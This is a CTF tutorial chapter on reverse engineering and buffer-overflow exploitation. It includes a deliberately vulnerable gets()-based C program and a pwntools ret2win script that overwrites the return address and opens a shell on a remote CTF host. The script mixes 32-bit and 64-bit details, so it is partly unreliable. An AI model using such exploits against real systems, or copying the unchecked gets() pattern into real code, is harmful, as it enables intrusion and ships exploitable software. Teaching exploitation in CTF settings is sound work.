---
title: "03 - Reverse Engineering & Pwn Tactics 🔄💥"
description: "This chapter covers the low-level arts: dismantling compiled binaries and exploiting memory corruption vulnerabilities."
keywords: ["AppSec", "Cybersecurity", "Security Guide", "Tutorial", "05 Offensive", "Ctf Guide", "03 Rev And Pwn Ctf Tactics.Md"]
---

# 03 - Reverse Engineering & Pwn Tactics 🔄💥

This chapter covers the low-level arts: dismantling compiled binaries and exploiting memory corruption vulnerabilities.

---

## 🔄 Reverse Engineering (Rev)

Reverse engineering involves taking a compiled binary and deducing its logic.

### Essential Tools
- **Ghidra:** A free, open-source Software Reverse Engineering (SRE) suite by the NSA. It includes an excellent decompiler.
- **IDA Free:** The industry standard disassembler.
- **gdb with pwndbg:** The GNU Debugger heavily customized for exploit development.

### Common Rev Workflow
1. **Identify the File:** Run `file binary` and `strings binary`. Look for obvious flag formats or hardcoded passwords.
2. **Static Analysis:** Open the binary in Ghidra. Look at the `main` function. Understand the control flow and variables.
3. **Dynamic Analysis:** Run the binary in `gdb`. Set breakpoints (e.g., `break main`), step through instructions (`ni`, `si`), and inspect registers and memory (`x/wx $esp`).

### Decompilation Example
A common CTF challenge compares user input against a modified string.
*Decompiled C (Ghidra):*
```c
void main(void) {
    char input [64];
    puts("Enter the flag:");
    gets(input);
    if (strcmp(input, "s3cr3t_fl4g_p4ss") == 0) {
        puts("Correct!");
    } else {
        puts("Wrong.");
    }
}
```
*Solution:* Run `strings` on the binary to find `"s3cr3t_fl4g_p4ss"`.

---

## 💥 Binary Exploitation (Pwn)

Pwn is about gaining control over the Instruction Pointer (EIP/RIP) to execute arbitrary code.

### 1. Buffer Overflow (BoF)
Occurs when data written to a buffer exceeds its boundaries, overwriting adjacent memory—most importantly, the saved Return Address on the stack.

**Vulnerable C Code:**
```c
#include <stdio.h>
void win() {
    system("/bin/sh");
}

void vuln() {
    char buffer[64];
    gets(buffer); // VULNERABILITY: No bounds checking!
}

int main() {
    vuln();
    return 0;
}
```

### 2. Return-Oriented Programming (ROP)
When the stack is non-executable (NX enabled), you cannot run shellcode injected into a buffer. ROP chains bypass this by reusing small snippets of existing executable code in the binary (called "gadgets", e.g., `pop rdi; ret;`).

### 3. Pwntools Python Exploit Script
`pwntools` is the standard Python library for CTF exploit development. It makes connecting to remote sockets, packing memory addresses, and interacting with binaries incredibly easy.

**Working Buffer Overflow Exploit:**
```python
#!/usr/bin/env python3
from pwn import *

# 1. Setup the target
binary_path = './vuln'
elf = context.binary = ELF(binary_path)

# 2. Connect (Local process or Remote network)
# p = process(binary_path)
p = remote('ctf.example.com', 1337)

# 3. Find offsets and addresses
offset = 72 # Determined via cyclic patterns in gdb
win_address = elf.symbols['win'] # Automagically gets the address of the win() function

log.info(f"Win function is at: {hex(win_address)}")

# 4. Craft the payload
payload = b"A" * offset         # Fill the buffer and saved EBP
payload += p32(win_address)     # Overwrite EIP/Return Address with win()

# 5. Send payload and get shell
p.sendlineafter(b"Enter input:", payload)
p.interactive() # Drops you into an interactive shell!
```

### Exploit Mitigations to Watch Out For:
- **NX (Non-Executable Stack):** Prevents executing shellcode on the stack. Bypass: ROP.
- **ASLR (Address Space Layout Randomization):** Randomizes memory addresses. Bypass: Information leaks to find base addresses.
- **Canaries:** A random value placed before the return address to detect overwrites. Bypass: Leak the canary, or brute-force it (if forking).
